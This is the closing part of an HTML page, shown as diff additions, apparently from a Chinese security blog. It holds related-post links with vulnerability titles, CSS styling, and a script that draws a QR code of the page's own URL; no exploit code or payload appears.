+     大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html">
+     东胜物流软件 MsAnnounceController SQL注入漏洞
+    </a>
+   </li>
+  </ul>
+ </div>
+ <style>
+  /* 底部展示样式 */
+        .qrcode-bottom-box {
+            margin: 40px auto;
+            text-align: center;
+        }
+        .qrcode-title {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 0px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .qrcode-bottom-box img {
+            display: inline-block;
+            padding: 10px;
+            background: #fff;
+            border-radius: 8px;
+            margin: 10px auto;
+        }
+
+/* 悬浮展示样式 */
+
+.qrcode-float {
+    position: fixed;
+    z-index: 9999;
+    background: rgba(255,255,255,0.98);
+    padding: 20px;
+    border-radius: 12px;
+    
+   
+}
+.qrcode-float:hover {
+           transform: scale(1.05);
+    }
+
+
+      
+   
+   /* 移动端适配 */
+    @media (max-width: 1440px) {
+        .qrcode-float {
+            right: 2%;
+            transform: none;
+        }
+    }
+    
+    /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        .qrcode-float {
+            display: none;
+        }
+    }
+ </style>
+ <div class="qrcode-float">
+  <div id="posts-qrcode">
+  </div>
+  <div class="qrcode-title" style="font-size: 12px;">
+   手机扫码阅读
+  </div>
+ </div>
+ <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+ </script>
+ <script>
+  var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/u8cloud-openapi-ce-paper-query-sqli.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+ </script>
+</article>
